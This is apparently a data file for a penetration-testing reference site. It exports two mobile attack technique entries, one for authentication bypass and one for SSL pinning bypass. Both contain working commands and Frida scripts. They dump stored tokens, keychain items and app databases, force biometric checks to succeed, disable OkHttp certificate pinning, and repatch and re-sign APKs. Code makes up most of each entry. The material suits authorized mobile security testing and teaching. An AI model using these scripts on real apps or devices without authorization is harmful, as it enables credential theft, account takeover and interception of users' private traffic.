export const mobileAuthTechniques = [
  {
    id: 'mob-auth-bypass',
    title: 'Mobile Authentication Bypass',
    subtitle: 'Bypass biometric, PIN, and token-based auth via runtime manipulation and API abuse',
    tags: ['Frida', 'biometric bypass', 'JWT', 'token storage', 'SharedPreferences', 'Keychain'],
    accentColor: 'blue',
    overview: 'Mobile apps frequently store authentication state insecurely or implement biometric checks client-side. Frida hooks allow bypassing authentication entirely by patching return values at runtime.',
    steps: [
      'Check SharedPreferences and SQLite for stored tokens, session cookies, or credentials',
      'Inspect Keychain (iOS) / Keystore (Android) for credential material — extractable on rooted/jailbroken devices',
      'Hook biometric authentication callbacks with Frida to force a success return value',
      'Intercept the auth API call and replay a captured valid JWT to access protected endpoints',
      'Test for insecure token storage: look for tokens in logcat, app files, or crash dumps',
      'Test server-side enforcement: remove the auth token from API requests and test for missing authorization checks',
    ],
    commands: [
      {
        title: 'Authentication bypass with Frida and Objection',
        code: `# Dump SharedPreferences (Android)
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml

# Dump Keychain (iOS — jailbroken)
objection -g com.target.app explore
ios keychain dump

# Dump SQLite databases
adb shell run-as com.target.app ls /data/data/com.target.app/databases/
adb pull /data/data/com.target.app/databases/app.db ./
sqlite3 app.db ".tables"
sqlite3 app.db "SELECT * FROM users;"

# Biometric bypass — Frida script
frida -U -l bypass_biometric.js -f com.target.app

# bypass_biometric.js (Android FingerprintManager)
Java.perform(function() {
  var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");
  FingerprintManager.authenticate.overload(
    "android.hardware.fingerprint.FingerprintManager$CryptoObject",
    "android.os.CancellationSignal","int",
    "android.hardware.fingerprint.FingerprintManager$AuthenticationCallback","android.os.Handler"
  ).implementation = function(crypto, cancel, flags, callback, handler) {
    callback.onAuthenticationSucceeded.call(callback, 
      FingerprintManager.AuthenticationResult.$new(crypto));
  };
});

# Objection biometric bypass (one-liner)
android biometric bypass`
      }
    ]
  },
  {
    id: 'mob-ssl-pinning',
    title: 'SSL Pinning Bypass',
    subtitle: 'Defeat certificate pinning to intercept HTTPS traffic with a custom CA',
    tags: ['SSL pinning', 'Frida', 'Objection', 'network_security_config', 'TrustManager', 'OkHttp'],
    accentColor: 'blue',
    overview: 'SSL certificate pinning prevents interception by rejecting TLS certificates not matching a hardcoded hash or certificate. Multiple bypass techniques exist depending on the pinning implementation (TrustManager, OkHttp, NSURLSession, Alamofire).',
    steps: [
      'Try Objection one-liner bypass first — covers most common implementations automatically',
      'If Objection fails, identify the pinning library from decompiled code (OkHttp, Retrofit, Alamofire)',
      'Write a targeted Frida hook for the specific TrustManager or checkServerTrusted method',
      'For iOS: hook SecTrustEvaluate or NSURLSession delegate methods',
      'Re-patch the APK: decompile with apktool, remove pinning code, recompile and sign with custom key',
      'Verify bypass: launch app and confirm traffic appears in Burp Proxy',
    ],
    commands: [
      {
        title: 'SSL pinning bypass techniques',
        code: `# Objection — try universal bypass first
objection -g com.target.app explore
android sslpinning disable

# Frida universal SSL pinning bypass (Android)
# Use: https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/
frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida \\
  -f com.target.app --no-pause

# OkHttp3 specific bypass
Java.perform(function() {
  var CertificatePinner = Java.use("okhttp3.CertificatePinner");
  CertificatePinner.check.overload("java.lang.String","java.util.List").implementation = function() {
    return;  // Do nothing — bypass
  };
  CertificatePinner.check.overload("java.lang.String","[Ljava.security.cert.Certificate;").implementation = function() {
    return;
  };
});

# iOS — Universal SSL Pinning Bypass
# Use: https://codeshare.frida.re/@masbog/frida-ios-pinning-bypass/
frida -U --codeshare masbog/frida-ios-pinning-bypass -f com.target.app

# APK re-patching: remove pinning statically
apktool d app.apk -o app_decoded/
# Edit network_security_config.xml: remove <pin-set> element
# Remove pinning code in smali: replace relevant method with empty return
apktool b app_decoded/ -o app_patched.apk
keytool -genkey -v -keystore custom.keystore -alias key -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA256withRSA -keystore custom.keystore app_patched.apk key
adb install app_patched.apk`
      }
    ]
  },
];